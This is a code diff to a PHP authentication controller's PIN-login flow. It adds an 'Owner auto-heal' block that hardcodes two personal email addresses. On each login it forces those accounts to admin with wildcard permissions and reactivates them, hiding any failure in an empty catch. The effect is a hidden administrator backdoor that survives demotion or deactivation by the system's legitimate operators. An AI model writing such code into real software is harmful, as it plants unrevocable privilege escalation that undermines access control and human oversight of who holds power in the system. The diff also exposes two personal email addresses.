@@ -277,9 +277,19 @@ class AuthController extends Controller
             ], 401);
         }
 
+        // Owner auto-heal: ensure specified owner accounts are always admin with full permissions
+        try {
+            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
+            if ($employee->email && in_array(strtolower($employee->email), $ownerEmails, true)) {
+                if ($employee->role !== 'admin' || $employee->permissions !== ['*'] || !$employee->is_active) {
+                    $employee->update(['role' => 'admin', 'permissions' => ['*'], 'is_active' => true]);
+                }
+            }
+        } catch (\Throwable $e) {}
+
         // Find or create user for this employee
         $user = User::where('employee_id', $employee->id)->first();
-        
+
         if (!$user) {
             $user = User::create([
                 'name' => $employee->full_name,
@@ -291,10 +301,11 @@ class AuthController extends Controller
                 'password' => Hash::make(Str::random(32)), // Random password since PIN is used
             ]);
         } else {
-            // Keep user role/permissions in sync with employee
+            // Keep user role/permissions in sync with employee (and owner override)
             $updates = [];
             if ($employee->role && $user->role !== $employee->role) $updates['role'] = $employee->role;
             if (is_array($employee->permissions) && $employee->permissions !== $user->permissions) $updates['permissions'] = $employee->permissions;
+            if ($user->is_active !== $employee->is_active) $updates['is_active'] = $employee->is_active;
             if (!empty($updates)) $user->update($updates);
         }
 
